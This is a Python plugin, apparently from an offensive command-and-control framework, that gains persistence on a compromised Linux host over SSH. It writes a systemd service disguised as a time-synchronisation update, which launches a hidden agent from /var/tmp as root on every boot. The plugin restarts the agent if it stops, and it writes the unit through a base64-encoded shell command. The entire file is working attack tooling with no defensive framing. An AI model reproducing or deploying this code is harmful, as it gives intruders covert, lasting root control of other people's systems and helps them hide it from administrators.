#!/usr/bin/env python3
"""
Creates a hidden systemd service that launches the C2 agent on boot.
"""

import base64
import os
from typing import Dict, Any

from core.plugins.base import (
    KillChainStage,
    OctopusPlugin,
    PluginResult,
    PluginType,
)

class SystemdPersistence(OctopusPlugin):
    name = "systemd"
    version = "1.0.0"
    description = "Installs payload via hidden systemd service."
    plugin_type = PluginType.PERSISTENCE
    kill_chain_stage = KillChainStage.PERSISTENCE
    capabilities = {"ssh", "file_write", "service_control"}

    def run(self, **kwargs) -> PluginResult:
        target = kwargs.get("target")
        payload_path = kwargs.get("payload_path", "/var/tmp/.octopus_agent")
        service_name = kwargs.get("service_name", "systemd-timesyncd-update.service")
        client = kwargs.get("ssh_client")

        if not client:
            return PluginResult(success=False, error="Requires an active ssh_client")

        # 1. Upload payload (simulated here via echo for testing, in reality use SFTP)
        # 2. Create service file
        service_content = f"""[Unit]
Description=System Time Synchronization Update Service
After=network.target

[Service]
Type=simple
ExecStart={payload_path}
Restart=always
RestartSec=60
User=root

[Install]
WantedBy=multi-user.target
"""
        service_path = f"/etc/systemd/system/{service_name}"
        
        try:
            from core.killchain.ssh_helpers import _ssh_exec
            
            # Write service file
            encoded = base64.b64encode(service_content.encode("utf-8")).decode("ascii")
            cmd = f"printf '%s' '{encoded}' | base64 -d > {service_path} && chmod 644 {service_path}"
            out = _ssh_exec(client, cmd)
            
            # Enable and start
            _ssh_exec(client, "systemctl daemon-reload")
            _ssh_exec(client, f"systemctl enable {service_name}")
            _ssh_exec(client, f"systemctl start {service_name}")
            
            return PluginResult(
                success=True,
                data={"service": service_name, "path": service_path, "target": target},
                output=out,
            )
        except Exception as e:
            return PluginResult(success=False, error=str(e))

# The class will be automatically discovered by plugin_manager.py
